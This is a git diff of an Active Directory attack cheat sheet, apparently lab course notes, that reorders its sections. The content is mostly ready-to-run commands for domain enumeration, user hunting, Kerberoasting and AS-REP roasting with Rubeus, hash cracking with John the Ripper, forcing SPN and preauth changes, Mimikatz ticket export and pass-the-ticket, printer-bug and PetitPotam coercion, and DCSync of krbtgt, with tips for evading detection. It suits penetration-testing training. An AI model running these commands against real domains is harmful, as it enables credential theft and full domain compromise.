@@ -307,6 +307,159 @@ PS> Get-DomainGPO -Identity {00000000-0000-0000-0000-000000000000}
 PS> (Get-DomainOU -Identity [OU]).gplink
 </details>
 <details>
+<summary>DOMAIN TRUST ENUMERATION</summary>
+<p>DESCRIPTION: </p>
+<h3> DOMAIN TRUST ENUMERATION WITH POWERSHELL</h3>
+
+<b> -TRUSTS- </b>
+
+- one way trust | users can access resources in one way, reverse is not allowed.
+- two way trust | bi-directional access is allowed
+
+TRANSITIVE: can be extended to establish trust relationships with other domains.
+NON-TRANSITIVE: cannot be extended to other domains in the forest. can be two-way or one-way.
+
+> parent-child trust
+> tree-root trust
+
+--both use two-way transitive trust
+
+> external trust | between two domains in different forest when forest do not have a trust relationship
+can be two-way or one-way and it is non-transitive
+
+> forest trust | between root domains, can be one-way or two-way, transitive or non-transitive
+
+Is a relationship between two domains or forests which allows users of one domain or forest to 
+access resources in the other domain or forest. 
+Trust can be automatic (parent-child, same forest etc.) or established (forest, external). 
+
+TDO / Trusted Domain Objects (represent the trust relation in a domain)
+
+<b>::: GET LIST OF ALL DOMAIN TRUSTS FOR THE CURRENT DOMAIN</b>
+
+PS> Get-DomainTrust
+PS> Get-DomainTrust -Domain [domain]
+
+PS> Get-ADTrust
+PS> Get-ADTrust -Identity [domain]
+
+<b>::: LIST ALL TRUST CURRENT FOREST</b> AD MODULE
+
+PS> Get-ADForest | %{Get-ADTrust -Filter *}
+
+<b>::: LIST TRUST IN CURRENT DOMAIN</b>
+
+PS> Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+PS> Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'
+
+<b>::: LIST EXTERNAL TRUST IN CURRENT FOREST</b>
+
+PS> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+PS> (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
+
+<b>::: MAP TRUSTS OF A FOREST</b>
+
+PS> Get-ForestTrust
+PS> Get-ForestTrust -Forest <root/forest>
+
+PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+
+<b>::: MAP TRSUTS OF CURRENT DOMAIN</b>
+
+PS> Get-ADTrust -Filter *
+
+<b>::: MAP TRUSTS OF EXTERNAL TRUST</b>
+
+PS> Get-ADTrust -Filter * -Server [xternalTrust]  
+</details>
+<details>
+<summary>DOMAIN USER ENUMERATION</summary>
+<p>DESCRIPTION: </p>
+<h3>DOMAIN ENUMERATION WITH POWERSHELL</h3>
+
+<b>:::GET LIST OF USER IN CURRENT DOMAIN</b>
+
+PS> Get-DomainUser
+PS> Get-DomainUser -Identity [user]
+
+PS> Get-ADUser -Filter * -Properties *
+PS> Get-ADUser -Identity [userName] -Properties *
+
+<b>:::GET LIST OF USERS BY NAME AND ITS COUNT</b>
+
+PS> Get-DomainUser | select samaccountname | measure
+
+<b>:::GET LIST OF A SPECIFIC PROPERTY OF USERS</b>
+
+PS> Get-DomainUser | select -ExpandProperty samaccountname
+
+<b>:::GET LIST OF PROPERTIES OF A USER IN CURRENT DOMAIN</b>
+
+PS> Get-DomainUser -Identity [user] -Properties *
+PS> Get-DomainUser -Properties samaccountname,logonCount ||| will help to retrieve and understand the normal activity of users 
+
+PS> Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
+PS> Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
+
+<b>:::SEARCH FOR A STRING IN A USER'S ATTRIBUTE</b>
+
+PS> Get-DomainUser -LDAPFilter "Description=*STRING*" | select name,Description
+
+PS> Get-ADUser -Filter 'Description -like "*STRING*"' -Properties Description | select name,Description
+
+<b>:::GET ACTIVELY LOGGED USERS ON A COMPUTER (NEED LOCAL ADMIN RIGHTS ON THE TARGET)</b>
+
+PS> Get-NetLoggedon -ComputerName [hostname]
+
+<b>:::GET LOCALLY LOGGED USERS ON A COMPUTER (NEED REMOTE REGISTRY ON THE TARGET - STARTED BY DEFAULT ON SERVER OS)</b>
+
+PS> Get-LoggedonLocal -ComputerName [hostname]
+
+<b>:::GET THE LAST LOGGED USER ON A COMPUTER (NEED ADMIN RIGHTS AND REMOTE REGISTRY ON THE TARGET)</b>
+
+PS> Get-LastLoggedOn -ComputerName [hostname]
+
+<b>::: GET USERS INFO TO CATCH DECOY USERS</b>
+
+PS> Get-DomainUser | select samaccountname,logoncount  
+</details>
+<details>
+<summary>DOMAIN ENUMERATION USERHUNTING</summary>
+<p>DESCRIPTION: </p>
+<h3> DOMAIN ENUMERATION - USER HUNTING </h3>
+
+<b>::: FIND ALL MACHINES ON THE CURRENT DOMAIN WHERE THE CURRENT USER HAS LOCAL ADMIN ACCESS</b>
+
+PS> Find-LocalAdminAccess –Verbose
+
+- This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use 
+multi-threaded "Invoke -CheckLocalAdminAccess" on each machine.
+
+- This can also be done with the help of remote administration tools like WMI and PowerShell remoting. 
+Pretty useful in cases ports (RPC and SMB) used by "Find-LocalAdminAccessare" blocked.
+
+- See "Find-WMILocalAdminAccess.ps1" and "Find-PSRemotingLocalAdminAccess.ps1"
+
+<b>::: FIND COMPUTERS WHERE A DOMAIN ADMIN (OR SPECIFIED USER/GROUP) HAS SESSIONS</b>
+
+PS> Find-DomainUserLocation -Verbose
+PS> Find-DomainUserLocation -UserGroupIdentity "[group]"
+
+This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using 
+"Get-DomainGroupMember", gets a list of computers (Get-DomainComputer) and list sessions and logged on users "(Get-NetSession/Get-NetLoggedon)" 
+from each machine.
+
+<b>::: FIND COMPUTERS WHERE A DOMAIN ADMIN SESSION IS AVAILABLE & CURRENT USER HAS ADMIN ACCESS </b>
+
+PS> Find-DomainUserLocation -CheckAccess
+
+<b>::: FIND COMPUTERS (FILE SERVERS AND DISTRIBUTED FILE SERVERS) WHERE A DOMAIN ADMIN SESSION IS AVAILABLE</b>
+
+PS> Find-DomainUserLocation -Stealth  
+</details>
+<details>
 <summary>DOMAIN GROUP MEMBERS ENUMERATION</summary>
 <p>DESCRIPTION: </p>
 <h3>DOMAIN GROUP/MEMBERS ENUMERATION WITH POWERSHELL</h3>
@@ -498,6 +651,9 @@ TIP: We can use winrs in place of PSRemoting to evade the logging and still reap
  
 PS> winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname  
 </details>
+
+<h4>POWERSHELL PRIVESC</h4>
+	
 <details>
 <summary>DOMAIN LOCAL PRIVESC</summary>
 <p>DESCRIPTION: </p>
@@ -544,6 +700,214 @@ NOTE: when cheking results. if exist a fifth parenthesis and at the end of that 
 to the following: {;;;WD)} it means "everyone". All the letters that compose every parenthesis means the
 different permissons assigned.  
 </details>
+<details>
+<summary>DOMAIN PRIVESC KERBEROAST</summary>
+<p>DESCRIPTION: </p>
+<h3> PRIVESC - KERBEROAST </h3>
+
+<b>::: FIND USER ACCOUNTS USED AS "SERVICE ACCOUNTS"</b>
+
+- ActiveDirectorymodule
+
+PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+- PowerView
+
+PS> Get-DomainUser –SPN
+
+<b>::: USE RUBEUS TO LIST Kerberoast STATS </b>
+
+PS> Rubeus.exe kerberoast /stats
+
+<b>::: USE RUBEUS TO REQUEST A TGS</b>
+
+PS> Rubeus.exe kerberoast /user:svcadmin /simple 
+
+NOTE: To avoid detections based on Encryption Downgrade for Kerberos EType(used by likes of ATA -0x17 stands for rc4-hmac), 
+look for Kerberoastableaccounts that only support RC4_HMAC
+
+PS> Rubeus.exe kerberoast /stats /rc4opsec
+
+PS> Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
+
+<b>::: KERBEROAST ALL POSSIBLE ACCOUNTS</b>
+
+PS> Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+
+<b>::: CRACK TICKET USING JOHN THE RIPPER</b>
+
+PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt  
+</details>
+<details>
+<summary>DOMAIN PRIVESC KERBEROAST ASREPs</summary>
+<p>DESCRIPTION: </p>
+<h3> PRIVESC - KERBEROAST AS-REPs </h3>
+
+If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. 
+Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
+
+With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.
+
+<b>::: Enumerating accounts with Kerberos Preauthdisabled</b>
+
+- Using PowerView
+
+PS> Get-DomainUser -PreauthNotRequired -Verbose
+
+- Using ActiveDirectorymodule
+
+PS> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+
+Force disable Kerberos Preauth:
+
+<b> ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView</b>
+
+PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+PS> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose
+
+PS> Get-DomainUser -PreauthNotRequired -Verbose
+
+Request encrypted AS-REP for offline brute-force
+
+Let's use ASREPRoast
+
+PS> Get-ASREPHash -UserName VPN1user -Verbose
+
+To enumerate all users with Kerberos preauthdisabled and request a hash
+
+PS> Invoke-ASREPRoast -Verbose
+
+We can use John The Ripper to brute-force the hashes offline
+
+PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt  
+</details>
+<details>
+<summary>DOMAIN PRIVESC KERBEROAST SetPN</summary>
+<p>DESCRIPTION: </p>
+<h3> PRIVESC - KERBEROAST | Set-SPN </h3>
+
+- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
+- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".
+
+<b>::: ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView(dev)</b>
+
+PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+<b>::: USING Powerview(dev), SEE IF THE USER ALREADY HAS A SPN</b>
+
+PS> Get-DomainUser -Identity supportuser | select serviceprincipalname
+
+<b>::: USING ActiveDirectory MODULE</b>
+
+PS> Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
+
+<b>::: SET A SPN FOR THE USER (must be unique for the domain)</b>
+
+PS> Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}
+
+<b>::: USING ActiveDirectory MODULE</b>
+
+PS> Set-ADUser -Identity support1user -ServicePrincipalNames@{Add='ops/whatever1'}
+
+<b>::: KERBEROAST THE USER</b>
+
+PS> Rubeus.exe kerberoast /outfile:targetedhashes.txt 
+PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt  
+</details>
+<details>
+<summary>DOMAIN PRIVESC KERBEROS DELEGATION</summary>
+<p>DESCRIPTION: </p>
+<h3> PRIVESC - KERBEROS DELEGATION </h3>
+
+allows to "reuse the end-user credentials to access resources hosted on a different server"
+
+GENERAL/BASIC OR UNCONSTRAINED DELEGATION: which allows the first hop server to request access
+to any service on any computer in the domain.
+
+>>> When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). 
+When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. 
+This way the server can reuse the user's TGT to access any other resource as the user
+
+<b>::: DISCOVER DOMAIN COMPUTERS WHICH HAVE UNCONSTRAINED DELEGATION ENABLED USING POWERVIEW</b>
+
+PS> Get-DomainComputer -UnConstrained
+
+<b>::: USING Active Directory MODULE</b>
+
+PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+
+PS> Get-ADUser -Filter {TrustedForDelegation -eq $True}
+
+- Compromise the server(s) where Unconstrained delegation is enabled.
+- We must trick or wait for a domain admin to connect a service on appsrv.
+
+Now, if the command is run again
+
+PS> Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
+
+The DA token could be reused
+
+PS> Invoke-Mimikatz -Command '"kerberos::pttC:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+<b>::: PRINTER BUG</b>
+
+A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to 
+connect to second a machine of the domain user's choice.
+
+<b> CAPTURE THE TGT OF dcorp-dc$ BY USING RUBEUS ON dcorp-appsrv</b>
+
+reference: (https://github.com/GhostPack/Rubeus) 
+
+PS> Rubeus.exe monitor /interval:5 /nowrap
+
+...and after that run MS-RPRN.exe on the student VM.
+
+reference: (https://github.com/leechristensen/SpoolSample) 
+
+PS> MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorp-appsrv.dollarcorp.moneycorp.local
+
+<b> COPY THE base64 ENCODED TGT, REMOVE EXTRA SPACES (if any) AND USE IT ON THE STUDENT VM</b>
+
+PS> Rubeus.exe ptt /tikcet:
+
+<b> ONCE THE TICKET IS INJECTED, RUN DCSync</b>
+
+PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+<b>::: PETIPOTAM</b>
+
+<b> We can also use PetitPotam.exe on dcorp-appsrv</b>
+
+reference: (https://github.com/topotam/PetitPotam) 
+
+PS> PetitPotam.exe dcorp-appsrv dcorp-dc
+
+On dcorp-appsrv
+
+PS> Rubeus.exe monitor /interval:5
+
+"PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't 
+need credentials when used against a DC"
+ 
+CONSTRAINED DELEGATION: which allows the first hop server (web server in our example) to request access only to 
+specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first 
+hop server, Windows offers Protocol Transition to transition the request to Kerberos  
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
 <details>
 <summary>DOMAIN OFFENSIVE.NET AV BYPASS</summary>
 <p>DESCRIPTION: </p>
@@ -619,6 +983,9 @@ PS> (Get-DomainOU -Identity [OUName]).distinguishedname | %{Get-DomainComputer -
 
 % = means each result (object)  
 </details>
+
+<h4>POWERSHELL PERSISTENCE</h4>	
+	
 <details>
 <summary>DOMAIN PERSISTENCE ACL ADMINSDHOLDER</summary>
 <p>DESCRIPTION: </p>
@@ -931,353 +1298,8 @@ Now, it is possible to access any machine with a valid username and password as 
 
 PS> Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator  
 </details>
-<details>
-<summary>DOMAIN PRIVESC KERBEROAST</summary>
-<p>DESCRIPTION: </p>
-<h3> PRIVESC - KERBEROAST </h3>
 
-<b>::: FIND USER ACCOUNTS USED AS "SERVICE ACCOUNTS"</b>
 
-- ActiveDirectorymodule
-
-PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-
-- PowerView
-
-PS> Get-DomainUser –SPN
-
-<b>::: USE RUBEUS TO LIST Kerberoast STATS </b>
-
-PS> Rubeus.exe kerberoast /stats
-
-<b>::: USE RUBEUS TO REQUEST A TGS</b>
-
-PS> Rubeus.exe kerberoast /user:svcadmin /simple 
-
-NOTE: To avoid detections based on Encryption Downgrade for Kerberos EType(used by likes of ATA -0x17 stands for rc4-hmac), 
-look for Kerberoastableaccounts that only support RC4_HMAC
-
-PS> Rubeus.exe kerberoast /stats /rc4opsec
-
-PS> Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
-
-<b>::: KERBEROAST ALL POSSIBLE ACCOUNTS</b>
-
-PS> Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
-
-<b>::: CRACK TICKET USING JOHN THE RIPPER</b>
-
-PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt  
-</details>
-<details>
-<summary>DOMAIN PRIVESC KERBEROAST ASREPs</summary>
-<p>DESCRIPTION: </p>
-<h3> PRIVESC - KERBEROAST AS-REPs </h3>
-
-If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. 
-Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
-
-With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.
-
-<b>::: Enumerating accounts with Kerberos Preauthdisabled</b>
-
-- Using PowerView
-
-PS> Get-DomainUser -PreauthNotRequired -Verbose
-
-- Using ActiveDirectorymodule
-
-PS> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
-
-Force disable Kerberos Preauth:
-
-<b> ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView</b>
-
-PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-
-PS> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose
-
-PS> Get-DomainUser -PreauthNotRequired -Verbose
-
-Request encrypted AS-REP for offline brute-force
-
-Let's use ASREPRoast
-
-PS> Get-ASREPHash -UserName VPN1user -Verbose
-
-To enumerate all users with Kerberos preauthdisabled and request a hash
-
-PS> Invoke-ASREPRoast -Verbose
-
-We can use John The Ripper to brute-force the hashes offline
-
-PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt  
-</details>
-<details>
-<summary>DOMAIN PRIVESC KERBEROAST SetPN</summary>
-<p>DESCRIPTION: </p>
-<h3> PRIVESC - KERBEROAST | Set-SPN </h3>
-
-- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
-- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".
-
-<b>::: ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView(dev)</b>
-
-PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-
-<b>::: USING Powerview(dev), SEE IF THE USER ALREADY HAS A SPN</b>
-
-PS> Get-DomainUser -Identity supportuser | select serviceprincipalname
-
-<b>::: USING ActiveDirectory MODULE</b>
-
-PS> Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
-
-<b>::: SET A SPN FOR THE USER (must be unique for the domain)</b>
-
-PS> Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}
-
-<b>::: USING ActiveDirectory MODULE</b>
-
-PS> Set-ADUser -Identity support1user -ServicePrincipalNames@{Add='ops/whatever1'}
-
-<b>::: KERBEROAST THE USER</b>
-
-PS> Rubeus.exe kerberoast /outfile:targetedhashes.txt 
-PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt  
-</details>
-<details>
-<summary>DOMAIN PRIVESC KERBEROS DELEGATION</summary>
-<p>DESCRIPTION: </p>
-<h3> PRIVESC - KERBEROS DELEGATION </h3>
-
-allows to "reuse the end-user credentials to access resources hosted on a different server"
-
-GENERAL/BASIC OR UNCONSTRAINED DELEGATION: which allows the first hop server to request access
-to any service on any computer in the domain.
-
->>> When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). 
-When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. 
-This way the server can reuse the user's TGT to access any other resource as the user
-
-<b>::: DISCOVER DOMAIN COMPUTERS WHICH HAVE UNCONSTRAINED DELEGATION ENABLED USING POWERVIEW</b>
-
-PS> Get-DomainComputer -UnConstrained
-
-<b>::: USING Active Directory MODULE</b>
-
-PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
-
-PS> Get-ADUser -Filter {TrustedForDelegation -eq $True}
-
-- Compromise the server(s) where Unconstrained delegation is enabled.
-- We must trick or wait for a domain admin to connect a service on appsrv.
-
-Now, if the command is run again
-
-PS> Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
-
-The DA token could be reused
-
-PS> Invoke-Mimikatz -Command '"kerberos::pttC:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
-
-<b>::: PRINTER BUG</b>
-
-A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to 
-connect to second a machine of the domain user's choice.
-
-<b> CAPTURE THE TGT OF dcorp-dc$ BY USING RUBEUS ON dcorp-appsrv</b>
-
-reference: (https://github.com/GhostPack/Rubeus) 
-
-PS> Rubeus.exe monitor /interval:5 /nowrap
-
-...and after that run MS-RPRN.exe on the student VM.
-
-reference: (https://github.com/leechristensen/SpoolSample) 
-
-PS> MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local  \\dcorp-appsrv.dollarcorp.moneycorp.local
-
-<b> COPY THE base64 ENCODED TGT, REMOVE EXTRA SPACES (if any) AND USE IT ON THE STUDENT VM</b>
-
-PS> Rubeus.exe ptt /tikcet:
-
-<b> ONCE THE TICKET IS INJECTED, RUN DCSync</b>
-
-PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
-
-<b>::: PETIPOTAM</b>
-
-<b> We can also use PetitPotam.exe on dcorp-appsrv</b>
-
-reference: (https://github.com/topotam/PetitPotam) 
-
-PS> PetitPotam.exe dcorp-appsrv dcorp-dc
-
-On dcorp-appsrv
-
-PS> Rubeus.exe monitor /interval:5
-
-"PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't 
-need credentials when used against a DC"
- 
-CONSTRAINED DELEGATION: which allows the first hop server (web server in our example) to request access only to 
-specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first 
-hop server, Windows offers Protocol Transition to transition the request to Kerberos  
-</details>
-<details>
-<summary>DOMAIN TRUST ENUMERATION</summary>
-<p>DESCRIPTION: </p>
-<h3> DOMAIN TRUST ENUMERATION WITH POWERSHELL</h3>
-
-<b> -TRUSTS- </b>
-
-- one way trust | users can access resources in one way, reverse is not allowed.
-- two way trust | bi-directional access is allowed
-
-TRANSITIVE: can be extended to establish trust relationships with other domains.
-NON-TRANSITIVE: cannot be extended to other domains in the forest. can be two-way or one-way.
-
-> parent-child trust
-> tree-root trust
-
---both use two-way transitive trust
-
-> external trust | between two domains in different forest when forest do not have a trust relationship
-can be two-way or one-way and it is non-transitive
-
-> forest trust | between root domains, can be one-way or two-way, transitive or non-transitive
-
-Is a relationship between two domains or forests which allows users of one domain or forest to 
-access resources in the other domain or forest. 
-Trust can be automatic (parent-child, same forest etc.) or established (forest, external). 
-
-TDO / Trusted Domain Objects (represent the trust relation in a domain)
-
-<b>::: GET LIST OF ALL DOMAIN TRUSTS FOR THE CURRENT DOMAIN</b>
-
-PS> Get-DomainTrust
-PS> Get-DomainTrust -Domain [domain]
-
-PS> Get-ADTrust
-PS> Get-ADTrust -Identity [domain]
-
-<b>::: LIST ALL TRUST CURRENT FOREST</b> AD MODULE
-
-PS> Get-ADForest | %{Get-ADTrust -Filter *}
-
-<b>::: LIST TRUST IN CURRENT DOMAIN</b>
-
-PS> Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
-
-PS> Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'
-
-<b>::: LIST EXTERNAL TRUST IN CURRENT FOREST</b>
-
-PS> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
-
-PS> (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
-
-<b>::: MAP TRUSTS OF A FOREST</b>
-
-PS> Get-ForestTrust
-PS> Get-ForestTrust -Forest <root/forest>
-
-PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
-
-<b>::: MAP TRSUTS OF CURRENT DOMAIN</b>
-
-PS> Get-ADTrust -Filter *
-
-<b>::: MAP TRUSTS OF EXTERNAL TRUST</b>
-
-PS> Get-ADTrust -Filter * -Server [xternalTrust]  
-</details>
-<details>
-<summary>DOMAIN USER ENUMERATION</summary>
-<p>DESCRIPTION: </p>
-<h3>DOMAIN ENUMERATION WITH POWERSHELL</h3>
-
-<b>:::GET LIST OF USER IN CURRENT DOMAIN</b>
-
-PS> Get-DomainUser
-PS> Get-DomainUser -Identity [user]
-
-PS> Get-ADUser -Filter * -Properties *
-PS> Get-ADUser -Identity [userName] -Properties *
-
-<b>:::GET LIST OF USERS BY NAME AND ITS COUNT</b>
-
-PS> Get-DomainUser | select samaccountname | measure
-
-<b>:::GET LIST OF A SPECIFIC PROPERTY OF USERS</b>
-
-PS> Get-DomainUser | select -ExpandProperty samaccountname
-
-<b>:::GET LIST OF PROPERTIES OF A USER IN CURRENT DOMAIN</b>
-
-PS> Get-DomainUser -Identity [user] -Properties *
-PS> Get-DomainUser -Properties samaccountname,logonCount ||| will help to retrieve and understand the normal activity of users 
-
-PS> Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
-PS> Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
-
-<b>:::SEARCH FOR A STRING IN A USER'S ATTRIBUTE</b>
-
-PS> Get-DomainUser -LDAPFilter "Description=*STRING*" | select name,Description
-
-PS> Get-ADUser -Filter 'Description -like "*STRING*"' -Properties Description | select name,Description
-
-<b>:::GET ACTIVELY LOGGED USERS ON A COMPUTER (NEED LOCAL ADMIN RIGHTS ON THE TARGET)</b>
-
-PS> Get-NetLoggedon -ComputerName [hostname]
-
-<b>:::GET LOCALLY LOGGED USERS ON A COMPUTER (NEED REMOTE REGISTRY ON THE TARGET - STARTED BY DEFAULT ON SERVER OS)</b>
-
-PS> Get-LoggedonLocal -ComputerName [hostname]
-
-<b>:::GET THE LAST LOGGED USER ON A COMPUTER (NEED ADMIN RIGHTS AND REMOTE REGISTRY ON THE TARGET)</b>
-
-PS> Get-LastLoggedOn -ComputerName [hostname]
-
-<b>::: GET USERS INFO TO CATCH DECOY USERS</b>
-
-PS> Get-DomainUser | select samaccountname,logoncount  
-</details>
-<details>
-<summary>DOMAIN ENUMERATION USERHUNTING</summary>
-<p>DESCRIPTION: </p>
-<h3> DOMAIN ENUMERATION - USER HUNTING </h3>
-
-<b>::: FIND ALL MACHINES ON THE CURRENT DOMAIN WHERE THE CURRENT USER HAS LOCAL ADMIN ACCESS</b>
-
-PS> Find-LocalAdminAccess –Verbose
-
-- This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use 
-multi-threaded "Invoke -CheckLocalAdminAccess" on each machine.
-
-- This can also be done with the help of remote administration tools like WMI and PowerShell remoting. 
-Pretty useful in cases ports (RPC and SMB) used by "Find-LocalAdminAccessare" blocked.
-
-- See "Find-WMILocalAdminAccess.ps1" and "Find-PSRemotingLocalAdminAccess.ps1"
-
-<b>::: FIND COMPUTERS WHERE A DOMAIN ADMIN (OR SPECIFIED USER/GROUP) HAS SESSIONS</b>
-
-PS> Find-DomainUserLocation -Verbose
-PS> Find-DomainUserLocation -UserGroupIdentity "[group]"
-
-This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using 
-"Get-DomainGroupMember", gets a list of computers (Get-DomainComputer) and list sessions and logged on users "(Get-NetSession/Get-NetLoggedon)" 
-from each machine.
-
-<b>::: FIND COMPUTERS WHERE A DOMAIN ADMIN SESSION IS AVAILABLE & CURRENT USER HAS ADMIN ACCESS </b>
-
-PS> Find-DomainUserLocation -CheckAccess
-
-<b>::: FIND COMPUTERS (FILE SERVERS AND DISTRIBUTED FILE SERVERS) WHERE A DOMAIN ADMIN SESSION IS AVAILABLE</b>
-
-PS> Find-DomainUserLocation -Stealth  
-</details>
 <details>
 <summary>REMOTE CONNECTION</summary>
 <p>DESCRIPTION: </p>
